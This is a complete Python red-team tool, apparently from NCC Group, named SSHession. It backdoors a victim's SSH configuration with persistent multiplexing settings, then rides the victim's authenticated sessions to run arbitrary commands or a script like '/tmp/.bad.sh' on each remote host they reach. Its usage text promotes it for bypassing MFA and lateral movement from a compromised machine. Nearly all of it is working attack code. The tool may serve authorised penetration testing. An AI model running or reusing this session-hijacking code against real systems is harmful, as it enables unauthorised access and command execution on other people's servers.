#!/usr/bin/env python

# Copyright (C) 2019 NCC Group
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# Written by Shaun Jones (@halfpintsec) of NCC Group

import sys
import os
import os.path
import time
import argparse
import subprocess
from datetime import datetime

def checkfordoor(sshConfLocation):
	if 'ControlMaster auto' in open(sshConfLocation).read():
		return False
	else:
		return True

def backdoor(sshConfLocation,ControlPathFile,PersistTime):
 try:
	if os.path.isfile(sshConfLocation) is True:        
		with open(sshConfLocation, 'r+') as f:
			content = f.read()
			f.seek(0, 0)
			bd = 'ControlMaster auto \nControlPath ' + ControlPathFile + '\nControlPersist '+ PersistTime + '\n'
			f.write(bd + '\n' + content)
			f.close()
			print "[+] Backdoor added @ " + str(datetime.now())
	else:
		with open(sshConfLocation, "r+") as f:
			content = f.read()
			f.seek(0, 0)
			bd = 'ControlMaster auto \nControlPath ' + ControlPathFile + '\nControlPersist '+ PersistTime + '\n'
			f.write(bd + '\n' + content)
			print "[+] Config file created & Backdoor added @ " + str(datetime.now())
			f.close()

 except Exception as e:
        print e
        exit()
 print "[i] Backdoor was successfully added!"
 return()

def checker(ControlPathFile,command,ctime):
	folder = '/'.join(ControlPathFile.split('/')[0:-1])+ '/'
	timea = 0
	flist = set([])
	while (timea < ctime ):
		for fname in os.listdir(folder):
			if fname.endswith('.c') and fname not in flist:
				print "[i] Connecting to " + str(fname)[:-2] + " and running command : '" + command + "' @ " + str(datetime.now())
				host2 = str(fname)[:-2]
				os.system("ssh -o 'RemoteCommand " + command + "' -S " + folder + "/" + str(fname) + " " + str(host2))
				print "[+] Command successfully executed on " + str(host2) + " @ " + str(datetime.now())
				flist.update([fname.strip()])
				break
		time.sleep(10)
		timea = timea + 1
	print "[i] Check limit reached, exiting! @ " + str(datetime.now())

def checkerfile(ControlPathFile,cfile,ctime):
	folder = '/'.join(ControlPathFile.split('/')[0:-1])+ '/'
	timea = 0
	flist = set([])
	while (timea < ctime ):
		for fname in os.listdir(folder):
			if fname.endswith('.c') and fname not in flist:
				print "[i] Connecting to " + str(fname)[:-2] + " and running commands from file : '" + cfile + "' @ " + str(datetime.now())
				host2 = str(fname)[:-2]
				os.system("ssh -T -S " + folder + "/" + str(fname) + " " + str(host2) + " < " + cfile + " >/dev/null 2>&1 & ")
				print "[+] Command successfully executed on " + str(host2) + " @ " + str(datetime.now())
				flist.update([fname.strip()])
				break
		time.sleep(10)
		timea = timea + 1
	print "[i] Check limit reached, exiting! @ " + str(datetime.now())

def main():
	banner = """  
                                                  
                    `.------.`                    
               ./oshhhhhhhhhhhhso/-               
           `:oyhhhhhhhhhhhhhhhhhhhhyo:`           
         `+yhhhhhhhhhhhhhhhhhhhhhhhhhhy+`         
       `/hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh+`       
      .yhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhy+       
     -yhhhhhhhhhhhhhhhhhhhhhhy+:-.``..-..         
    .yhhhhhhhhhhhhhhhhhhhhho.     ``              
    shhhhhhhhhhhhhhhhhhhhh:  `:oys:`              
   -hhhhhhhhhhhhhhhhhhhhy- .ohhy:    .-:::-.      
   +hhhhhhhhhhhhhhhhhhho.`+hhh+`  :shhhhhhhhhs:   
   ohhhhhhhhhhhhhhhyo/..+yyo:`   `..-:/osyys+-    
   +hhhhhhyo+++:-----....`  `-:::-`               
   -hhhhyssyhysyhhhhhho- ./shhhhhhhys+:.          
    shysoo++/+ossso+:`./shhhhhhhhhhhhhhhhyssyy    
    .yhhhhhhhyso+++osyhhhhhhhhhhhhhhhhhhhhhhh-    
     -yhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh-     
      .yhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhy.      
       `/hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh+`       
         `+yhhhhhhhhhhhhhhhhhhhhhhhhhhy+.         
           `:oyhhhhhhhhhhhhhhhhhhhhyo:`           
               -/oshhhhhhhhhhhhso/-               
                    `.--::--.`                    
                                                                     
  /$$$$$$  /$$$$$$ /$$   /$$                          /$$                  
 /$$__  $$/$$__  $| $$  | $$                         |__/                  
| $$  \__| $$  \__| $$  | $$ /$$$$$$  /$$$$$$$/$$$$$$$/$$ /$$$$$$ /$$$$$$$ 
|  $$$$$$|  $$$$$$| $$$$$$$$/$$__  $$/$$_____/$$_____| $$/$$__  $| $$__  $$
 \____  $$\____  $| $$__  $| $$$$$$$|  $$$$$|  $$$$$$| $| $$  \ $| $$  \ $$
 /$$  \ $$/$$  \ $| $$  | $| $$_____/\____  $\____  $| $| $$  | $| $$  | $$
|  $$$$$$|  $$$$$$| $$  | $|  $$$$$$$/$$$$$$$/$$$$$$$| $|  $$$$$$| $$  | $$
 \______/ \______/|__/  |__/\_______|_______|_______/|__/\______/|__/  |__/
                                                                           
The SSH Multiplex Backdoor Tool 
By Shaun Jones (@halfpintsec) of NCC Group
"""
	usage = """

SSHession uses SSH Multiplexing to create Backdoors for any SSH session being created using a particular SSH config. Depending on permissions, backdoors can be created using the system wide config (/etc/ssh/ssh_config) or just a users. 

This technique is extremely useful when you need to bypass MFA and move laterally across a network. It also works if you are on a user's host and they are SSHing with a password protected key.

Example of command:

The following creates a backdoor in Bob's ssh config (with the backdoor persisting for 50 minutes), executing the contents of '/tmp/.bad.sh' from the current host in any backdoored SSH sessions. This script need to be executed on the compromised host.

              SSHession.py -f /Users/bob/.ssh/config -t 50m -C /tmp/.bad.sh

"""
	print banner
	parser = argparse.ArgumentParser(usage=usage)
	parser.add_argument('-f', help='The ssh config file to backdoor, default is ~/.ssh/config', dest='scl', action='store', required=False)
	parser.add_argument('-t', help='The time for each backdoor to last in minutes, default is 60m', dest='pt', action='store', required=False)
	parser.add_argument('-c', help='This is the command to be executed on the socket if one is made. The checker will check every 2 seconds', dest='command', action='store', required=False)
	parser.add_argument('-C', help='The full path and filename containing commands to be executed', dest='cfile', action='store', required=False)
	parser.add_argument('-T', help='This flag is the amount of times that we check for new connections, the default is 10', dest='ctime', action='store', required=False)
	if len(sys.argv[1:])==0:
		parser.print_help()
		exit()
	opts = parser.parse_args()
	sshConfLocation = opts.scl
	PersistTime = opts.pt
	command = opts.command
	cfile = opts.cfile
	print "[i] Starting up @ " + str(datetime.now())
	if opts.ctime:
		ctime = int(opts.ctime)
	else:
		ctime = 10
	ControlPathFile = os.getenv("HOME") + "/.ssh/%h.c" 
	if not sshConfLocation:
		sshConfLocation = os.getenv("HOME") + "/.ssh/config"	
	if not PersistTime:
		PersistTime = "60m"
	check = checkfordoor(sshConfLocation)
	if check == True:
		backdoor(sshConfLocation,ControlPathFile,PersistTime)
	if command:
		print "[i] Running checks for backdoored sessions... @ " + str(datetime.now())
		checker(ControlPathFile,command,ctime)
	if cfile:
		if os.path.isfile(cfile) is True:
			print "[i] Running checks for backdoored sessions... @ " + str(datetime.now())
			checkerfile(ControlPathFile,cfile,ctime)
		else:
			print "no file found at " + cfile
			exit()

if __name__ == "__main__":
	main()
